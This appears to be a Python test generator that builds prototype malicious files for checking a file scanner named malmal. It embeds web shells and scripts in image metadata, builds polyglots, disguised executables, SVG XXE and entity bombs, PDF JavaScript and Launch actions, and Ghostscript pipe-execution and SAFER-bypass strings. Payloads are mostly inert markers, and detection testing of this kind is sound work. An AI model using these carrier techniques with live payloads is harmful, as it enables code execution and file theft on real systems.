#!/usr/bin/env python3
"""Writes about a hundred prototype attack files for checking malmal.

Every file only carries the marker a scanner should react to: a tag, a
dictionary key, an operator name. None of them does anything when opened; the
payloads print a fixed string or name a command that is never reached.

    python3 tests/prototypes/generate.py [OUTPUT_DIR]

The default output directory is `tests/prototypes/files`. `manifest.csv` in it
lists each file with the technique it stands for.
"""

import csv
import gzip
import struct
import sys
import zlib
from pathlib import Path

PHP = b"<?php echo 'malmal-prototype'; ?>"
SHORT_TAG = b"<?=system('id')?>"
JSP = b'<%@ page import="java.io.*" %><% out.print("malmal-prototype"); %>'
ASP = b'<%=eval(request("malmal-prototype"))%>'
SCRIPT = b"<script>alert('malmal-prototype')</script>"
ZIP = b"PK\x03\x04\x14\0\0\0\0\0" + b"\0" * 16 + b"\x05\0\0\0a.txtPK\x05\x06" + b"\0" * 18
ELF = b"\x7fELF\x02\x01\x01\0" + b"\0" * 56
PE = b"MZ\x90\0" + b"\0" * 56 + b"\x40\0\0\0PE\0\0" + b"\0" * 20

SAMPLES = []

BASE = Path(__file__).parent / "base"


def carrier(fmt):
    """A real, viewable picture rendered by ImageMagick, used as the shell a
    payload hides behind so the file still opens as an ordinary photo."""
    return (BASE / f"base.{fmt}").read_bytes()


def jpeg_segment_after_soi(real, marker, body):
    """Insert one marker segment right after the JPEG start marker."""
    return real[:2] + segment(marker, body) + real[2:]


def png_insert_after_ihdr(real, new_chunk):
    """Insert a chunk between IHDR and the image data of a real PNG."""
    cut = 8 + 4 + 4 + 13 + 4  # signature + the whole IHDR chunk
    return real[:cut] + new_chunk + real[cut:]


def gif_insert_before_trailer(real, block):
    """Insert an extension block before the trailer of a real GIF."""
    assert real.endswith(b"\x3b")
    return real[:-1] + block + b"\x3b"


def webp_add_chunk(real, kind, body):
    """Append a RIFF chunk to a real WebP and fix the container size. The base
    picture is an extended (VP8X) WebP, so ancillary chunks are well formed."""
    chunks = real[12:] + riff(kind, body)
    return b"RIFF" + struct.pack("<I", len(chunks) + 4) + b"WEBP" + chunks


def sample(name, technique, data, expect="block"):
    """`expect` is what a scanner should do: "block" (flag as suspicious or
    malicious) or "clean" (a benign look-alike that must not be flagged)."""
    SAMPLES.append((name, technique, bytes(data), expect))


def clean(name, technique, data):
    sample(name, technique, data, expect="clean")


# --- Raster images ---------------------------------------------------------


def chunk(kind, body):
    crc = zlib.crc32(kind + body) & 0xFFFFFFFF
    return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)


def png(extra=b"", width=1, height=1, end=True):
    data = b"\x89PNG\r\n\x1a\n"
    data += chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0))
    data += extra
    data += chunk(b"IDAT", zlib.compress(b"\0\0\0\0\0"))
    return data + (chunk(b"IEND", b"") if end else b"")


def jpeg(segments=b"", width=1, height=1):
    """A baseline JPEG with one 8x8 block of grey."""
    quant = b"\xff\xdb\x00\x43\x00" + b"\x01" * 64
    frame = b"\xff\xc0\x00\x0b\x08" + struct.pack(">HH", height, width) + b"\x01\x01\x11\x00"
    dc = b"\xff\xc4\x00\x14\x00" + b"\x01" + b"\0" * 15 + b"\x00"
    ac = b"\xff\xc4\x00\x14\x10" + b"\x01" + b"\0" * 15 + b"\x00"
    scan = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00" + b"\x00"
    jfif = b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    return b"\xff\xd8" + jfif + segments + quant + frame + dc + ac + scan + b"\xff\xd9"


def segment(marker, body):
    return b"\xff" + bytes([marker]) + struct.pack(">H", len(body) + 2) + body


def gif(extension=b"", width=1, height=1, trailer=True):
    data = b"GIF89a" + struct.pack("<HH", width, height) + b"\x80\x00\x00"
    data += b"\x00\x00\x00\xff\xff\xff"
    data += extension
    data += b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00"
    return data + (b"\x3b" if trailer else b"")


def gif_comment(text):
    blocks = b"".join(
        bytes([len(text[i : i + 255])]) + text[i : i + 255] for i in range(0, len(text), 255)
    )
    return b"\x21\xfe" + blocks + b"\x00"


def bmp(width=1, height=1):
    pixels = b"\x00\x00\xff\x00"
    header = struct.pack("<IiiHHIIiiII", 40, width, height, 1, 24, 0, len(pixels), 2835, 2835, 0, 0)
    return b"BM" + struct.pack("<IHHI", 54 + len(pixels), 0, 0, 54) + header + pixels


def webp(extra=b""):
    lossless = b"\x2f\x00\x00\x00\x00\x07\x10\x11\x11\x88\x88\xfe\x07\x00"
    body = b"WEBP" + riff(b"VP8L", lossless) + extra
    return b"RIFF" + struct.pack("<I", len(body)) + body


def riff(kind, body):
    return kind + struct.pack("<I", len(body)) + body + (b"\0" if len(body) % 2 else b"")


def tiff(description=None, next_ifd=0):
    """A little-endian TIFF with one 1x1 strip."""
    entries = [
        (256, 3, 1, 1),
        (257, 3, 1, 1),
        (258, 3, 1, 8),
        (259, 3, 1, 1),
        (262, 3, 1, 1),
        (273, 4, 1, 8),
        (278, 3, 1, 1),
        (279, 4, 1, 1),
    ]
    count = len(entries) + (description is not None)
    text_at = 10 + 2 + count * 12 + 4
    if description is not None:
        entries.insert(5, (270, 2, len(description), text_at))
    data = b"II*\x00" + struct.pack("<I", 10) + b"\x80\x00"
    data += struct.pack("<H", len(entries))
    for tag, kind, length, value in entries:
        data += struct.pack("<HHII", tag, kind, length, value)
    return data + struct.pack("<I", next_ifd) + (description or b"")


def psd(resources=b""):
    data = b"8BPS\x00\x01" + b"\0" * 6 + struct.pack(">HIIHH", 1, 1, 1, 8, 1)
    data += struct.pack(">I", 0)
    data += struct.pack(">I", len(resources)) + resources
    data += struct.pack(">I", 0)
    return data + b"\x00\x00" + b"\x80"


def psd_resource(ident, body):
    padded = body + (b"\0" if len(body) % 2 else b"")
    return b"8BIM" + struct.pack(">H", ident) + b"\0\0" + struct.pack(">I", len(body)) + padded


def images():
    """Each payload rides inside a real rendered picture (`base/base.*`) so the
    file still opens as an ordinary photo; the structure-only cases (truncation,
    oversized dimensions, bad checksums) are built by hand because a genuine
    image cannot carry those defects."""
    j, p, g = carrier("jpg"), carrier("png"), carrier("gif")
    b, w, t, d = carrier("bmp"), carrier("webp"), carrier("tiff"), carrier("psd")
    exif = b"Exif\0\0II*\x00\x08\0\0\0\x01\0\x0e\x01\x02\0" + struct.pack("<II", len(PHP), 26) + b"\0\0\0\0" + PHP

    sample("jpeg-php-comment.jpg", "PHP in a JPEG comment segment", jpeg_segment_after_soi(j, 0xFE, PHP))
    sample("jpeg-php-exif.jpg", "PHP in an EXIF ImageDescription", jpeg_segment_after_soi(j, 0xE1, exif))
    sample("jpeg-php-after-eoi.jpg", "PHP appended after the end of the image", j + PHP)
    sample("jpeg-short-tag-after-eoi.jpg", "PHP short tag appended to a JPEG", j + SHORT_TAG)
    sample("jpeg-jsp-comment.jpg", "JSP directive in a JPEG comment", jpeg_segment_after_soi(j, 0xFE, JSP))
    sample("jpeg-asp-comment.jpg", "ASP expression in a JPEG comment", jpeg_segment_after_soi(j, 0xFE, ASP))
    sample("jpeg-script-comment.jpg", "HTML script in a JPEG comment", jpeg_segment_after_soi(j, 0xFE, SCRIPT))
    sample("jpeg-zip-polyglot.jpg", "ZIP archive appended to a JPEG", j + ZIP)
    sample("jpeg-pdf-polyglot.jpg", "PDF appended to a JPEG", j + pdf({}))
    sample("jpeg-elf-appended.jpg", "ELF executable appended to a JPEG", j + ELF)
    sample("jpeg-truncated.jpg", "JPEG cut off before its end marker", j[:-64])
    sample("jpeg-pixel-bomb.jpg", "JPEG declaring 65535x65535 pixels", jpeg(width=65535, height=65535))
    sample("jpeg-html-appended.jpg", "HTML page appended to a JPEG", j + b"<html><body>" + SCRIPT + b"</body></html>")
    sample("jpeg-php-icc.jpg", "PHP in an ICC profile segment", jpeg_segment_after_soi(j, 0xE2, b"ICC_PROFILE\0\x01\x01" + PHP))

    sample("png-php-text.png", "PHP in a PNG tEXt chunk", png_insert_after_ihdr(p, chunk(b"tEXt", b"Comment\0" + PHP)))
    sample("png-php-ztxt.png", "PHP in a compressed zTXt chunk", png_insert_after_ihdr(p, chunk(b"zTXt", b"Comment\0\0" + zlib.compress(PHP))))
    sample("png-script-itxt.png", "Script in a compressed iTXt chunk", png_insert_after_ihdr(p, chunk(b"iTXt", b"Comment\0\x01\0\0\0" + zlib.compress(SCRIPT))))
    sample("png-php-after-iend.png", "PHP appended after IEND", p + PHP)
    sample("png-zip-polyglot.png", "ZIP archive appended to a PNG", p + ZIP)
    sample("png-pixel-bomb.png", "PNG declaring 65535x65535 pixels", png(width=65535, height=65535))
    sample("png-truncated.png", "PNG without its IEND chunk", p[: p.rindex(b"IEND") - 4])
    sample("png-bad-crc.png", "PNG chunk with a wrong checksum", png_insert_after_ihdr(p, chunk(b"tEXt", b"x\0y"))[:-5] + b"\0" + p[-4:])
    sample("png-ztxt-bomb.png", "zTXt chunk inflating to 300 MB", png_insert_after_ihdr(p, chunk(b"zTXt", b"Comment\0\0" + zlib.compress(b"\0" * (300 << 20), 9))))
    sample("png-php-private-chunk.png", "PHP in a private ancillary chunk", png_insert_after_ihdr(p, chunk(b"prVt", PHP)))
    sample("png-jsp-text.png", "JSP directive in a PNG tEXt chunk", png_insert_after_ihdr(p, chunk(b"tEXt", b"Comment\0" + JSP)))
    sample("png-php-idat.png", "PHP placed in an extra IDAT chunk", png_insert_after_ihdr(p, chunk(b"IDAT", PHP)))

    sample("gif-php-comment.gif", "PHP in a GIF comment extension", gif_insert_before_trailer(g, gif_comment(PHP)))
    sample("gif-script-after-trailer.gif", "Script appended after the GIF trailer", g + SCRIPT)
    sample("gif-php-after-trailer.gif", "PHP appended after the GIF trailer", g + PHP)
    sample("gif-truncated.gif", "GIF without its trailer", g[: len(g) // 2])
    sample("gif-pixel-bomb.gif", "GIF declaring a 65535x65535 screen", gif(width=65535, height=65535))
    sample("gif-php-application.gif", "PHP in a GIF application extension", gif_insert_before_trailer(g, b"\x21\xff\x0bMALMAL  1.0" + bytes([len(PHP)]) + PHP + b"\x00"))

    sample("webp-php-exif.webp", "PHP in a WebP EXIF chunk", webp_add_chunk(w, b"EXIF", PHP))
    sample("webp-php-trailing.webp", "PHP appended after the RIFF container", w + PHP)
    sample("webp-short-riff.webp", "RIFF size smaller than the file", w[:4] + struct.pack("<I", 12) + w[8:])
    sample("webp-php-xmp.webp", "PHP in a WebP XMP chunk", webp_add_chunk(w, b"XMP ", PHP))

    sample("bmp-php-trailing.bmp", "PHP appended to a BMP", b + PHP)
    sample("bmp-pixel-bomb.bmp", "BMP declaring 65535x65535 pixels", bmp(width=65535, height=65535))
    sample("bmp-zip-polyglot.bmp", "ZIP archive appended to a BMP", b + ZIP)

    sample("tiff-php-description.tif", "PHP in a TIFF ImageDescription", tiff(PHP + b"\0"))
    sample("tiff-ifd-loop.tif", "TIFF whose directory points at itself", tiff(next_ifd=10))
    sample("tiff-bigtiff.tif", "BigTIFF header", b"II+\x00\x08\x00\x00\x00" + struct.pack("<Q", 16) + struct.pack("<Q", 0) + b"\0" * 8)
    sample("tiff-php-trailing.tif", "PHP appended to a TIFF", t + PHP)

    sample("psd-php-resource.psd", "PHP in a PSD image resource", psd(psd_resource(1028, PHP)))
    sample("psd-php-trailing.psd", "PHP appended to a PSD", d + PHP)
    sample("psd-script-resource.psd", "Script in a PSD XMP resource", psd(psd_resource(1060, SCRIPT)))


# --- Disguised files -------------------------------------------------------


def disguises():
    sample("elf.jpg", "ELF executable named as a JPEG", ELF)
    sample("pe.png", "Windows executable named as a PNG", PE)
    sample("macho.gif", "Mach-O executable named as a GIF", b"\xcf\xfa\xed\xfe\x07\0\0\x01" + b"\0" * 24)
    sample("shell-script.jpg", "Shell script named as a JPEG", b"#!/bin/sh\necho malmal-prototype\n")
    sample("java-class.bmp", "Java class file named as a BMP", b"\xca\xfe\xba\xbe\0\0\0\x34" + b"\0" * 24)
    sample("zip.png", "ZIP archive named as a PNG", ZIP)
    sample("html.jpg", "HTML page named as a JPEG", b"<!DOCTYPE html><html><body>" + SCRIPT + b"</body></html>")
    sample("php.png", "PHP source named as a PNG", PHP)
    sample("png-named.jpg", "PNG content under a JPEG name", png())
    sample("image.php.jpg", "Valid JPEG with a double extension", jpeg())
    sample("image.png.exe", "Valid PNG named as an executable", png())
    sample("image.phtml", "Valid GIF named as a PHP template", gif())
    sample("random.png", "Unrecognizable bytes named as a PNG", bytes((i * 37 + 11) % 256 for i in range(512)))
    sample("empty.jpg", "Empty file", b"")
    sample("htaccess.jpg", "Apache configuration named as a JPEG", b"AddType application/x-httpd-php .jpg\n")
    sample("svg-named.png", "SVG with a script under a PNG name", svg(SCRIPT.decode()))
    sample("gif-php-header.gif", "PHP file starting with a GIF signature", b"GIF89a" + PHP)
    sample("gif-javascript-header.gif", "GIF header that reads as a script", b"GIF89a=1;alert('malmal-prototype');//")


# --- SVG -------------------------------------------------------------------

SVG_NS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"'


def svg(body, prolog="", attributes=""):
    text = f'<?xml version="1.0"?>\n{prolog}<svg {SVG_NS} width="10" height="10"{attributes}>{body}</svg>\n'
    return text.encode()


def svgs():
    rect = '<rect width="10" height="10"{}/>'
    sample("svg-script.svg", "Script element", svg("<script>alert('malmal-prototype')</script>"))
    sample("svg-script-cdata.svg", "Script element with CDATA", svg("<script type=\"text/ecmascript\"><![CDATA[alert('malmal-prototype')]]></script>"))
    sample("svg-script-external.svg", "Script loaded from another host", svg('<script xlink:href="https://example.invalid/a.js"/>'))
    sample("svg-script-prefixed.svg", "Script element under a namespace prefix", b'<?xml version="1.0"?>\n<s:svg xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script></s:svg>\n')
    sample("svg-onload.svg", "onload handler on the root", svg(rect.format(""), attributes=" onload=\"alert('malmal-prototype')\""))
    sample("svg-onclick.svg", "onclick handler on a shape", svg(rect.format(' onclick="alert(1)"')))
    sample("svg-onbegin.svg", "onbegin handler on an animation", svg('<animate attributeName="x" dur="1s" onbegin="alert(1)"/>'))
    sample("svg-javascript-href.svg", "javascript: link", svg('<a xlink:href="javascript:alert(1)">' + rect.format("") + "</a>"))
    sample("svg-javascript-entities.svg", "javascript: link spelled with character references", svg('<a href="&#106;ava&#x09;script&#58;alert(1)">' + rect.format("") + "</a>"))
    sample("svg-animate-href.svg", "Animation that sets a javascript: link", svg('<a><animate attributeName="href" to="javascript:alert(1)"/>' + rect.format("") + "</a>"))
    sample("svg-set-href.svg", "set element that writes a javascript: link", svg('<a><set attributeName="xlink:href" to="javascript:alert(1)"/>' + rect.format("") + "</a>"))
    sample("svg-data-html.svg", "Link to an HTML data: URI", svg('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">' + rect.format("") + "</a>"))
    sample("svg-data-svg-image.svg", "Image holding a nested SVG with a script", svg('<image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4="/>'))
    sample("svg-foreign-object.svg", "foreignObject with an HTML iframe", svg('<foreignObject width="10" height="10"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://example.invalid/"/></foreignObject>'))
    sample("svg-foreign-object-script.svg", "foreignObject with an HTML script", svg('<foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject>'))
    sample("svg-xxe.svg", "External entity reading a local file", svg("<text>&xxe;</text>", prolog='<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'))
    sample("svg-xxe-parameter.svg", "Parameter entity loading a remote DTD", svg("<text>x</text>", prolog='<!DOCTYPE svg [<!ENTITY % ext SYSTEM "https://example.invalid/x.dtd"> %ext;]>\n'))
    laughs = "".join(f'<!ENTITY l{i} "{"&l" + str(i - 1) + ";" if i else "lol"}{("&l" + str(i - 1) + ";") * 9 if i else ""}">' for i in range(10))
    sample("svg-entity-bomb.svg", "Nested entity expansion", svg("<text>&l9;</text>", prolog=f"<!DOCTYPE svg [{laughs}]>\n"))
    sample("svg-external-image.svg", "Image fetched from another host", svg('<image href="https://example.invalid/track.png" width="1" height="1"/>'))
    sample("svg-external-use.svg", "use element pointing at another host", svg('<use xlink:href="https://example.invalid/a.svg#x"/>'))
    sample("svg-css-import.svg", "Stylesheet importing a remote file", svg('<style>@import url("https://example.invalid/a.css");</style>' + rect.format("")))
    sample("svg-css-url.svg", "Style attribute fetching a remote file", svg(rect.format(' style="fill:url(https://example.invalid/a.svg#p)"')))
    sample("svg-xml-stylesheet.svg", "xml-stylesheet instruction naming a remote file", svg(rect.format(""), prolog='<?xml-stylesheet type="text/xsl" href="https://example.invalid/a.xsl"?>\n'))
    sample("svg-file-image.svg", "Image read from a local path", svg('<image href="file:///etc/hostname"/>'))
    sample("svg-script.svgz", "Compressed SVG with a script", gzip.compress(svg("<script>alert(1)</script>"), mtime=0))
    sample("svg-utf16-script.svg", "UTF-16 SVG with a script", "﻿".encode("utf-16-le") + f'<svg {SVG_NS}><script>alert(1)</script></svg>'.encode("utf-16-le"))
    sample("svg-php-comment.svg", "PHP inside an XML comment", svg("<!-- " + PHP.decode() + " -->" + rect.format("")))
    sample("svg-handler.svg", "XML Events handler element", svg('<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>'))


# --- PDF -------------------------------------------------------------------


def stream(body, entries=b""):
    return b"<< /Length %d %s>>\nstream\n" % (len(body), entries) + body + b"\nendstream"


def pdf(extra, catalog=b"", trailer=b"", version=b"1.7", page=b"", extra_objs=None):
    """A one-page PDF; `extra` maps object numbers from 5 up to their bodies.
    `extra_objs` merges additional objects (for cases needing more than `extra`)."""
    objects = {
        1: b"<< /Type /Catalog /Pages 2 0 R " + catalog + b">>",
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R " + page + b">>",
        4: stream(b"0 0 10 10 re f"),
    }
    objects.update(extra)
    if extra_objs:
        objects.update(extra_objs)
    data = b"%PDF-" + version + b"\n%\xe2\xe3\xcf\xd3\n"
    offsets = {}
    for number in sorted(objects):
        offsets[number] = len(data)
        data += b"%d 0 obj\n" % number + objects[number] + b"\nendobj\n"
    start = len(data)
    size = max(objects) + 1
    data += b"xref\n0 %d\n0000000000 65535 f \n" % size
    for number in range(1, size):
        data += b"%010d 00000 n \n" % offsets[number] if number in offsets else b"0000000000 65535 f \n"
    data += b"trailer\n<< /Size %d /Root 1 0 R %s>>\nstartxref\n%d\n%%%%EOF\n" % (size, trailer, start)
    return data


JS = b"<< /S /JavaScript /JS (app.alert\\('malmal-prototype'\\)) >>"


def pdfs():
    sample("pdf-openaction-js.pdf", "JavaScript run when the document opens", pdf({5: JS}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-names-js.pdf", "JavaScript in the document name tree", pdf({5: JS}, catalog=b"/Names << /JavaScript << /Names [(a) 5 0 R] >> >> "))
    sample("pdf-page-aa.pdf", "JavaScript in a page's additional actions", pdf({5: JS}, page=b"/AA << /O 5 0 R >> "))
    sample("pdf-catalog-aa.pdf", "JavaScript run when the document closes", pdf({5: JS}, catalog=b"/AA << /WC 5 0 R >> "))
    sample("pdf-js-stream.pdf", "JavaScript held in a compressed stream", pdf({5: b"<< /S /JavaScript /JS 6 0 R >>", 6: stream(zlib.compress(b"app.alert('malmal-prototype')"), b"/Filter /FlateDecode ")}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-js-hex-filter.pdf", "JavaScript behind ASCIIHex and Flate filters", pdf({5: b"<< /S /JavaScript /JS 6 0 R >>", 6: stream(zlib.compress(b"app.alert(1)").hex().encode() + b">", b"/Filter [/ASCIIHexDecode /FlateDecode] ")}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-js-obfuscated-name.pdf", "JavaScript key written with hex escapes", pdf({5: b"<< /S /J#61v#61Script /J#53 (app.alert\\(1\\)) >>"}, catalog=b"/Open#41ction 5 0 R "))
    sample("pdf-js-hex-string.pdf", "JavaScript written as a hex string", pdf({5: b"<< /S /JavaScript /JS <" + b"app.alert(1)".hex().encode() + b"> >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-launch.pdf", "Launch action naming a program", pdf({5: b"<< /S /Launch /F (calc.exe) >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-launch-win.pdf", "Launch action with Windows parameters", pdf({5: b"<< /S /Launch /Win << /F (cmd.exe) /P (/c echo malmal-prototype) >> >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-uri.pdf", "URI action run when the document opens", pdf({5: b"<< /S /URI /URI (https://example.invalid/) >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-submit-form.pdf", "Form submitted to another host", pdf({5: b"<< /S /SubmitForm /F (https://example.invalid/collect) >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-import-data.pdf", "ImportData action", pdf({5: b"<< /S /ImportData /F (data.fdf) >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-gotor.pdf", "Remote go-to action", pdf({5: b"<< /S /GoToR /F (\\\\\\\\example.invalid\\\\share\\\\a.pdf) /D [0 /Fit] >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-gotoe.pdf", "Embedded go-to action", pdf({5: b"<< /S /GoToE /F (a.pdf) /D [0 /Fit] >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("pdf-embedded-exe.pdf", "Embedded Windows executable", pdf({5: b"<< /Type /Filespec /F (setup.exe) /EF << /F 6 0 R >> >>", 6: stream(PE, b"/Type /EmbeddedFile ")}, catalog=b"/Names << /EmbeddedFiles << /Names [(setup.exe) 5 0 R] >> >> "))
    sample("pdf-embedded-svg.pdf", "Embedded SVG that carries a script", pdf({5: b"<< /Type /Filespec /F (a.svg) /EF << /F 6 0 R >> >>", 6: stream(svg("<script>alert(1)</script>"), b"/Type /EmbeddedFile ")}, catalog=b"/Names << /EmbeddedFiles << /Names [(a.svg) 5 0 R] >> >> "))
    sample("pdf-file-attachment.pdf", "File attachment annotation", pdf({5: b"<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 5 5] /FS 6 0 R >>", 6: b"<< /Type /Filespec /F (a.js) /EF << /F 7 0 R >> >>", 7: stream(b"alert(1)", b"/Type /EmbeddedFile ")}, page=b"/Annots [5 0 R] "))
    sample("pdf-rich-media.pdf", "RichMedia annotation", pdf({5: b"<< /Type /Annot /Subtype /RichMedia /Rect [0 0 5 5] /RichMediaContent << >> >>"}, page=b"/Annots [5 0 R] "))
    sample("pdf-xfa.pdf", "XFA form", pdf({5: stream(b"<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\"><script>xfa.host.messageBox('x')</script></xdp:xdp>")}, catalog=b"/AcroForm << /Fields [] /XFA 5 0 R >> "))
    sample("pdf-field-js.pdf", "JavaScript on a form field keystroke", pdf({5: b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /Rect [0 0 5 5] /AA << /K 6 0 R >> >>", 6: JS}, catalog=b"/AcroForm << /Fields [5 0 R] >> ", page=b"/Annots [5 0 R] "))
    sample("pdf-annot-js.pdf", "JavaScript on a link annotation", pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] /A 6 0 R >>", 6: JS}, page=b"/Annots [5 0 R] "))
    sample("pdf-encrypted.pdf", "Encrypted document", pdf({5: b"<< /Filter /Standard /V 1 /R 2 /O <" + b"00" * 32 + b"> /U <" + b"00" * 32 + b"> /P -4 >>"}, trailer=b"/Encrypt 5 0 R /ID [<00><00>] "))
    plain = pdf({})
    update = b"5 0 obj\n" + JS + b"\nendobj\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
    first, second = len(plain), len(plain) + len(b"5 0 obj\n" + JS + b"\nendobj\n")
    tail = b"xref\n1 1\n%010d 00000 n \n5 1\n%010d 00000 n \ntrailer\n<< /Size 6 /Root 1 0 R /Prev %d >>\nstartxref\n%d\n%%%%EOF\n" % (second, first, plain.rindex(b"xref\n0"), len(plain) + len(update))
    sample("pdf-incremental-js.pdf", "JavaScript added by an incremental update", plain + update + tail)
    objstm_items = [b"<< /S /Launch /F (calc.exe) >>"]
    objstm = b"5 0 " + objstm_items[0]
    sample("pdf-launch-objstm.pdf", "Launch action hidden in an object stream", pdf({6: stream(zlib.compress(objstm), b"/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode ")}, catalog=b"/OpenAction 5 0 R ", version=b"1.5"))
    sample("pdf-ps-xobject.pdf", "PostScript XObject", pdf({5: stream(b"(%pipe%id) (r) file", b"/Type /XObject /Subtype /PS ")}, page=b"/Resources << /XObject << /P 5 0 R >> >> "))
    sample("pdf-flate-bomb.pdf", "Page content stream inflating to 300 MB", pdf({4: stream(zlib.compress(b"\0" * (300 << 20), 9), b"/Filter /FlateDecode ")}))
    sample("pdf-php-after-eof.pdf", "PHP appended after the end of the PDF", plain + PHP)
    sample("pdf-junk-prefix.pdf", "HTML page placed before the PDF header", b"<html>" + SCRIPT + b"</html>\n" + plain)
    sample("pdf-truncated.pdf", "PDF cut off before its cross-reference table", plain[: plain.rindex(b"xref\n0")])
    sample("pdf-js-no-action-type.pdf", "JavaScript reached through a /Next chain", pdf({5: b"<< /S /URI /URI (https://example.invalid/) /Next 6 0 R >>", 6: JS}, catalog=b"/OpenAction 5 0 R "))


# --- PostScript ------------------------------------------------------------


def eps(body, header="%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 10 10\n"):
    return (header + body + "\n0 0 moveto 10 10 lineto stroke\nshowpage\n%%EOF\n").encode("latin-1")


def postscripts():
    cases = [
        ("ps-pipe-read", "Command run through the %pipe% device", "(%pipe%id) (r) file"),
        ("ps-pipe-write", "Output piped to a command", "(%pipe%cat > /dev/null) (w) file"),
        ("ps-pipe-concat", "%pipe% name assembled from two strings", "(%pi) (pe%id) concatstrings (r) file"),
        ("ps-file-read", "Local file opened for reading", "(/etc/hostname) (r) file 64 string readstring"),
        ("ps-file-write", "Local file opened for writing", "(/tmp/malmal-prototype) (w) file closefile"),
        ("ps-deletefile", "File deleted", "(/tmp/malmal-prototype) deletefile"),
        ("ps-renamefile", "File renamed", "(/tmp/a) (/tmp/b) renamefile"),
        ("ps-filenameforall", "Directory listed", "(/etc/*) { pop } 256 string filenameforall"),
        ("ps-run", "Another file executed with run", "(/tmp/malmal-prototype.ps) run"),
        ("ps-forceput", "Protected dictionary written with .forceput", "systemdict /SAFER false .forceput"),
        ("ps-superexec", "superexec", "{ } 1183615869 internaldict /superexec get exec"),
        ("ps-setuserparams", "Permissions changed through .setuserparams", "<< /PermitFileReading [(*)] >> .setuserparams"),
        ("ps-putdeviceprops", "Device properties replaced", "currentdevice null true mark /OutputFile (/tmp/malmal-prototype) .putdeviceprops"),
        ("ps-setpagedevice-output", "Output file set through setpagedevice", "<< /OutputFile (/tmp/malmal-prototype) >> setpagedevice"),
        ("ps-tempfile", "Scratch file created", "null (w) .tempfile closefile pop"),
        ("ps-libfile", "Library file opened", "(gs_init.ps) .libfile"),
        ("ps-getenv", "Environment variable read", "(HOME) getenv"),
        ("ps-exec-string", "Code built from a string and executed", "(1 2 add pop) cvx exec"),
        ("ps-exec-hex-string", "Code hidden in a hex string", "<" + b"(%pipe%id) (r) file".hex() + "> cvx exec"),
        ("ps-exec-a85", "Code decoded from ASCII85 at run time", "currentfile /ASCII85Decode filter cvx exec\n" + a85(b"(%pipe%id) (r) file") + "~>"),
        ("ps-exec-name", "Operator name built at run time", "(deletefi) (le) concatstrings cvn cvx exec"),
        ("ps-load-operator", "Operator fetched from systemdict by name", "(/tmp/a) systemdict /deletefile get exec"),
        ("ps-bind-alias", "File operator hidden behind an alias", "/f { file } bind def (/etc/hostname) (r) f"),
        ("ps-restore-trick", "Type confusion setup named in advisories", "/x save def x restore .eqproc"),
        ("ps-pdf-interpreter", "Internal PDF interpreter operator", "null .pdfexectoken"),
        ("ps-statusdict", "statusdict used to reach printer state", "statusdict begin (%disk0%) devstatus end"),
        ("ps-stdin", "Further code read from standard input", "(%stdin) (r) file cvx exec"),
    ]
    for name, technique, body in cases:
        sample(name + ".eps", technique, eps(body))
    sample("ps-pipe.ai", "Illustrator file running a command", eps("(%pipe%id) (r) file", header="%!PS-Adobe-3.0\n%%Creator: Adobe Illustrator(R) 8.0\n"))
    sample("ps-pipe.ps", "Plain PostScript running a command", eps("(%pipe%id) (r) file", header="%!PS\n"))
    sample("ps-pipe-named.jpg", "PostScript running a command under a JPEG name", eps("(%pipe%id) (r) file"))
    text = eps("(%pipe%id) (r) file")
    wmf = b"\xd7\xcd\xc6\x9a" + b"\0" * 28
    header = b"\xc5\xd0\xd3\xc6" + struct.pack("<IIIIII", 30, len(text), 30 + len(text), len(wmf), 0, 0) + b"\xff\xff"
    sample("ps-dos-binary-pipe.eps", "DOS binary EPS whose PostScript runs a command", header + text + wmf)
    sample("ps-pjl-prefix.eps", "Printer job language before the PostScript", b"\x1b%-12345X@PJL ENTER LANGUAGE=POSTSCRIPT\n" + text)


def a85(data):
    import base64

    return base64.a85encode(data).decode()


def zip_with(name, body=b"x"):
    """A minimal ZIP holding one named entry (stored, no compression)."""
    crc = zlib.crc32(body) & 0xFFFFFFFF
    n = name.encode()
    local = b"PK\x03\x04\x14\0\0\0\0\0\0\0\0\0" + struct.pack("<I", crc) + struct.pack("<II", len(body), len(body)) + struct.pack("<H", len(n)) + b"\0\0" + n + body
